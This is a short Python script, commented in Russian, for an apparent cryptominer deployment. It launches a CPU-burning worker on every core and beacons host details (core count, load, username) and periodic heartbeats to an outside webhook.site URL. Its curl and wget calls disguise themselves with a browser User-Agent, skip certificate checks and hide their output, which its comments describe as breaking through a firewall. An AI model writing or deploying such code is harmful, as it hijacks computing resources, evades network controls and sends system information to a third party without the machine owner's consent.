import os
import sys
import json
import multiprocessing
import time
import subprocess

# Твой хук
HOOK_URL = "https://webhook.site/d9ed8938-0733-4ce3-8d2c-63dab5606e87"

def force_send_status(event, data):
    """Пытается пробить файрвол разными способами"""
    payload = json.dumps({"EVENT": event, "DATA": data, "TS": time.time()})
    
    # Способ 1: curl с маскировкой под браузер
    try:
        subprocess.run([
            'curl', '-k', '-m', '5', '-X', 'POST', 
            '-H', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            '-H', 'Content-Type: application/json',
            '-d', payload, HOOK_URL
        ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except: pass

    # Способ 2: wget (часто забывают ограничить)
    try:
        subprocess.run([
            'wget', '--no-check-certificate', '--quiet', '--method=POST',
            '--body-data=' + payload, '--header=Content-Type:application/json',
            HOOK_URL
        ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except: pass

def worker(id):
    # Каждое ядро шлет статус о старте
    force_send_status("CORE_START", {"id": id})
    while True:
        # Твой 2K Miner
        n = os.urandom(256) # Просто для нагрузки пока
        pass

if __name__ == "__main__":
    print("[*] Launching Bypass & Status Report...")
    
    # 1. Сразу шлем главный статус
    force_send_status("SYSTEM_INIT", {
        "cores": multiprocessing.cpu_count(),
        "load": os.getloadavg(),
        "user": os.getlogin() if hasattr(os, 'getlogin') else 'root'
    })

    # 2. Запуск 48 потоков
    for i in range(multiprocessing.cpu_count()):
        p = multiprocessing.Process(target=worker, args=(i,))
        p.start()

    # 3. Мониторинг и периодический статус
    while True:
        time.sleep(30)
        force_send_status("HEARTBEAT", {"load": os.getloadavg()})
        print(f"[*] Heartbeat sent. Load: {os.getloadavg()}")
        sys.stdout.flush()
